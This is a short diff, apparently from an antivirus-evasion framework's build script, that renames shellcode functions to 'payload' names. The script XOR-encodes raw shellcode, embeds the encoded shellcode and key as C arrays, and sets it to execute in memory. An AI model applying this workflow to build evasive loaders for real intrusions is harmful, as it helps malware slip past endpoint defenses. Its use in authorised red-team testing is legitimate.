@@ -28,13 +28,13 @@ printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
 generate_key preset aabbcc12de input/key_raw.txt
 
 # encode shellcode
-encode_shellcode xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
+encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
 
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
 
 # set shellcode source
-set_shellcode_source static_from_file input/scenc_c.txt
+set_payload_source static_from_file input/scenc_c.txt
 
 # convert generated key from raw to C into array "key"
 ./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
@@ -46,7 +46,7 @@ set_key_source static_from_file input/key_c.txt
 set_decoder xor
 
 # set shellcode binding technique
-set_shellcode_binding exec_shellcode
+set_payload_execution_method exec_shellcode
 
 # enable debug printing
 enable_debug_print to_file C:/avetdbg.txt
